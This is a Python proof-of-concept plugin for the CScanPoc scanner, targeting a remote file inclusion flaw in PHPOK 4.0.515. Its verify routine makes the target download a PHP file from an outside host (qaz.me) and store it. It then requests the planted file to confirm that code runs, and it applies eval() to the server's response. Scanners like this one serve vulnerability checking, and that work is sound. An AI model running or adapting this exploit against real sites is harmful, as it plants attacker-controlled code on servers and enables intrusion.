# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import sys


class Vuln(ABVuln):
    vuln_id = 'PHPOK_0004_p'  # 平台漏洞编号，留空
    name = 'PHPOK 4.0.515 远程文件包含'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.RFI  # 漏洞类型
    disclosure_date = '2014-06-03'  # 漏洞公布时间
    desc = '''
        PHPOK是一套允许用户高度自由配置的企业站程序，基于LGPL协议开源授权。
        /framework/www/ueditor_control.php行61，
        remote_image_f函数没对远程文件后缀做检查直接保存到本地。
    '''  # 漏洞描述
    ref = 'https://www.secpulse.com/archives/25006.html'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'PHPOK'  # 漏洞应用名称
    product_version = '4.0.515'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '819d7f8e-664c-4df6-b0d4-28cad4cfd32c'
    author = '47bwy'  # POC编写者
    create_date = '2018-06-20'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # 需要有准备好的远程文件 c.txt?.php
            # <?php echo md5(c);?>
            payload = "/index.php?c=ueditor&f=remote_image&upfile=http://qaz.me/c.txt?.php"
            url = self.target + payload
            r = requests.get(url)
            # 获取shell地址
            try:
                r_dict = eval(r.text)
            except Exception as e:
                # self.output.info("远程文件没有执行")
                sys.exit(1)
            r_value = r_dict['url']
            r_shell = '/' + r_value
            url_shell = self.target + r_shell
            r = requests.get(url_shell)
            if '4a8a08f09d37b73795649038408b5f33' in r.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
